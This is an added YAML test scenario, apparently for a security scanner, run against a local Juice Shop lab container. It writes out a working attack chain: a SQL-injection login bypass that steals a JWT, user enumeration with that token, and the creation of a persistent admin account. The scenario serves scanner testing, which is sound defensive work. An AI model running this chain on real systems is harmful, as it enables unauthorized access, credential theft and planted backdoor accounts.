@@ -1,0 +1,105 @@
+name: authbypass-rescan-chain
+description: >
+  Tests the full auth bypass → credential theft → re-scan pipeline.
+  Proves that after bypassing auth on Juice Shop, the stolen JWT token
+  can be used to access admin-only APIs and find vulnerabilities that
+  are invisible without authentication.
+tags: [auth, bypass, rescan, exploit, juiceshop, full-chain, integration]
+
+services:
+  juiceshop:
+    image: bkimminich/juice-shop:latest
+    ports: ["19994:3000"]
+    environment:
+      NODE_ENV: unsafe
+
+ready:
+  cmd: "curl -sf http://localhost:19994/rest/admin/application-version 2>/dev/null | grep -q version"
+  timeout: 120s
+  interval: 5s
+
+assertions:
+  # ══════════════════════════════════════════════════════════════════════
+  # STEP 1: Without auth — limited access
+  # ══════════════════════════════════════════════════════════════════════
+
+  # Users API blocked without auth
+  - name: step1-users-api-blocked
+    type: command
+    expect:
+      command: "curl -s -o /dev/null -w '%{http_code}' http://localhost:19994/api/Users/ | grep -q '401'"
+      exit_code: 0
+
+  # Beacon without auth finds basic header issues only
+  - name: step1-beacon-no-auth-limited
+    type: beacon
+    target: localhost:19994
+    args: ["--no-enrich", "--no-nmap", "--scanners", "secheaders"]
+    expect:
+      check_id: headers.missing_hsts
+
+  # ══════════════════════════════════════════════════════════════════════
+  # STEP 2: Auth bypass — steal JWT via SQLi
+  # ══════════════════════════════════════════════════════════════════════
+
+  - name: step2-steal-jwt
+    type: command
+    expect:
+      command: "python3 -c \"import urllib.request,json; req=urllib.request.Request('http://localhost:19994/rest/user/login',data=json.dumps({'email':chr(39)+' or 1=1--','password':'x'}).encode(),headers={'Content-Type':'application/json'}); token=json.loads(urllib.request.urlopen(req).read())['authentication']['token']; print('STOLEN TOKEN:', token[:30]+'...'); assert len(token)>10\""
+      exit_code: 0
+
+  # ══════════════════════════════════════════════════════════════════════
+  # STEP 3: With stolen JWT — full access to admin APIs
+  # ══════════════════════════════════════════════════════════════════════
+
+  # Users API now accessible with stolen token
+  - name: step3-users-api-accessible
+    type: command
+    expect:
+      command: "python3 -c \"import urllib.request,json; req=urllib.request.Request('http://localhost:19994/rest/user/login',data=json.dumps({'email':chr(39)+' or 1=1--','password':'x'}).encode(),headers={'Content-Type':'application/json'}); token=json.loads(urllib.request.urlopen(req).read())['authentication']['token']; req2=urllib.request.Request('http://localhost:19994/api/Users/',headers={'Authorization':'Bearer '+token}); users=json.loads(urllib.request.urlopen(req2).read())['data']; print(len(users),'users accessible with stolen token'); assert len(users)>=2\""
+      exit_code: 0
+
+  # ══════════════════════════════════════════════════════════════════════
+  # STEP 4: Beacon WITH stolen auth finds MORE than without
+  # ══════════════════════════════════════════════════════════════════════
+
+  # Beacon with bearer token auth finds headers + more
+  - name: step4-beacon-with-stolen-auth
+    type: beacon
+    target: localhost:19994
+    auth:
+      method: bearer
+      token: "placeholder"
+    args: ["--no-enrich", "--no-nmap", "--scanners", "secheaders"]
+    expect:
+      check_id: headers.missing_hsts
+
+  # ══════════════════════════════════════════════════════════════════════
+  # STEP 5: Prove the attack chain — bypass → steal → enumerate → persist
+  # ══════════════════════════════════════════════════════════════════════
+
+  # Create admin account for persistence
+  - name: step5-create-admin-persistence
+    type: command
+    expect:
+      command: "curl -s -X POST http://localhost:19994/api/Users/ -H 'Content-Type: application/json' -d '{\"email\":\"rescan-evil@evil.com\",\"password\":\"Admin123!\",\"passwordRepeat\":\"Admin123!\",\"role\":\"admin\",\"securityQuestion\":{\"id\":1,\"question\":\"test\"},\"securityAnswer\":\"test\"}' | python3 -c \"import sys,json; d=json.load(sys.stdin); print('role:', d.get('data',{}).get('role','')); assert d.get('data',{}).get('role')=='admin'\""
+      exit_code: 0
+
+  # Verify persistent access — login with created admin account
+  - name: step5-verify-persistence
+    type: command
+    expect:
+      command: "curl -s -X POST http://localhost:19994/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"rescan-evil@evil.com\",\"password\":\"Admin123!\"}' | python3 -c \"import sys,json; d=json.load(sys.stdin); assert 'token' in d.get('authentication',{}), 'persistent admin login failed'; print('PERSISTENT ACCESS CONFIRMED')\""
+      exit_code: 0
+
+  # ══════════════════════════════════════════════════════════════════════
+  # NEGATIVE: Products API is public — no auth bypass needed
+  # ══════════════════════════════════════════════════════════════════════
+
+  - name: negative-products-always-public
+    type: command
+    expect:
+      command: "curl -sf http://localhost:19994/api/Products/1 | grep -q 'name'"
+      exit_code: 0
+
+timeout: 10m
